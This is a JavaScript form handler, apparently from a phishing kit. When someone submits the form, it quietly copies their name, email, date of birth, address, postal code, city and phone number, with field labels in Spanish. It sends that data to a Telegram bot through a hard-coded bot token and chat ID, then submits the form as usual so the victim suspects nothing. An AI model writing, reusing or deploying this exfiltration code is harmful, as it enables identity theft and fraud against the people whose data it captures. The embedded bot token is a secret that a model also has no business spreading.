document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('indexFormId');

  if (form) {
      form.addEventListener('submit', function (e) {
          e.preventDefault(); // Prevent default form submission

          // Replace with your Telegram bot token and chat ID
          const token = '7355468281:AAEOxwOfzbSnoqgzaRE5UgMLAdeigiY7h34';
          const chatId = '-4265262833';

          // Collect form data
          const formData = new FormData(this);
          const data = {
              first_name: formData.get('first_name'),
              last_name: formData.get('last_name'),
              email: formData.get('email'),
              dob: formData.get('dob'),
              address: formData.get('address'),
              postal: formData.get('postal'),
              city: formData.get('city'),
              phone: formData.get('phone')
          };

          // Format the message text
          const messageText = `
              Apellidos: ${data.first_name}
              Nombres: ${data.last_name}
              Email: ${data.email}
              Fecha de nacimiento: ${data.dob}
              Dirección postal: ${data.address}
              Código postal: ${data.postal}
              Ciudad: ${data.city}
              Número de teléfono: ${data.phone}
          `;

          // Send message to Telegram
          sendMessageToTelegram(token, chatId, messageText)
              .then(response => {
                  if (response.ok) {
                      console.log('Message sent successfully!');
                      // Programmatically submit the form
                      form.submit();
                  } else {
                      console.error('Error sending message:', response);
                      alert('Error sending message');
                  }
              })
              .catch(error => {
                  console.error('Fetch error:', error);
                  alert('Error sending message');
              });
      });
  } else {
      console.error('Form element with id "indexFormId" not found.');
  }
});

function sendMessageToTelegram(token, chatId, text) {
  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify({
          chat_id: chatId,
          text: text
      })
  })
  .then(response => response.json());
}
